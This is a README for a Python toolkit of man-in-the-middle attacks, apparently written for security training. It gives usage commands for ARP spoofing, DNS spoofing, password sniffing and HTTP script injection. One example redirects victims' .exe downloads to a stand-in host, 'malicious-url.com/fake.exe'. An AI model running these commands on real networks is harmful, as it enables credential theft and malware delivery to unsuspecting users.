# Network Utilities Collection

## Overview
This collection of network utilities provides essential tools for network analysis and security testing. Use them responsibly and in accordance with legal and ethical guidelines.

## Tools

### 1. MAC Address Changer Tool

#### Description
This tool allows you to change the MAC address of a network interface, which can be useful for anonymity or network testing.

#### Usage
To change the MAC address of a specified network interface, use the following command:

```bash
python macchanger.py -i <interface> -m <new_mac>
```
#### Example
```bash
python macchanger.py -i eth0 -m 00:11:22:33:44:55
```

### 2. Network Scanner Tool

#### Description
This tool scans a specified IP address or range of IP addresses to identify active devices on the local network.

#### Usage
To run the Network Scanner Tool, use the following command:

```bash
python network_scanner.py -t <target_ip>
```
#### Example
```bash
python network_scanner.py -t 192.168.1.0/24
```
### 3. ARP Spoofing Tool

#### Description
This tool performs ARP spoofing, allowing an attacker to intercept and manipulate traffic between two devices on a local network.

#### Usage
To run the ARP Spoofing Tool, use the following command:

```bash
python arpspoof.py -t <target_ip> -s <spoof_ip>

```
#### Example
```bash
python arpspoof.py -t 192.168.1.10 -s 192.168.1.1
```

### 4. Packet Sniffer Tool

#### Description
This tool captures and analyzes packets on a specified network interface, allowing you to extract sensitive information such as usernames and passwords.

#### Usage
To run the Packet Sniffer Tool, use the following command:

```bash
python packet_sniffer.py
```
#### Example
```bash
python packet_sniffer.py
```

### 5. DNS Spoofing Tool

#### Description
This tool intercepts DNS requests and spoofs DNS responses, redirecting the target to a specified IP address for a given domain.

#### Usage
Run the tool using the following command:

```bash
sudo python3 dnsspoof.py -w <website> -i <spoof_ip>
```

```bash
sudo python3 dnsspoof.py -w example.com -i 192.168.1.100
```
#### Install dependencies:
```bash
pip install netfilterqueue
```
#### Notes
Use iptables to redirect DNS requests to the Netfilter queue:
```bash
sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
```
Clear iptables after use
```bash
sudo iptables --flush
```
### 6. File Download Interception Tool

#### Description
This tool intercepts HTTP requests for specific file types (e.g., `.exe`, `.pdf`) and redirects the download to a specified location using Scapy and NetfilterQueue.

#### Usage
Run the tool using the following command:

```bash
sudo python3 file_intercept.py -f <file_type> -d <redirect_url>
 ```
#### Example:
```bash
sudo python3 file_intercept.py -f .exe -d http://malicious-url.com/fake.exe
```
#### Install dependencies:
```bash
pip install netfilterqueue
```
#### Notes
Use iptables to redirect DNS requests to the Netfilter queue:
```bash
sudo iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0
```
Clear iptables after use
```bash
sudo iptables --flush
```
# 7. Packet Injection Tool

## Description

This tool allows for packet injection into HTTP responses using Python, `scapy`, and `netfilterqueue`. It intercepts network traffic and modifies the payload to inject custom code.

## Prerequisites

- **Python 3.x**
- **Scapy**: Install with `pip install scapy`
- **NetfilterQueue**: Install with `pip install netfilterqueue`

## Installation

1. Ensure you have the necessary Python libraries installed.
2. Save the provided packet injection code in a file (e.g., `injector.py`).

## Usage

### Running the Script

Run the script with root privileges, specifying the injection code:

```bash
sudo python injector.py -c "<script>Your Injection Code Here</script>"
```
#### Example:
```bash
sudo python injector.py -c "<script>alert('Hello, World!');</script>"

```
#### Install dependencies:
```bash
pip install netfilterqueue
```
#### Notes
Use iptables to redirect DNS requests to the Netfilter queue:
```bash
sudo iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0
```
Clear iptables after use
```bash
sudo iptables --flush
```
## Conclusion
This collection of network utilities provides essential tools for network analysis and security testing. Use them responsibly and in accordance with legal and ethical guidelines.

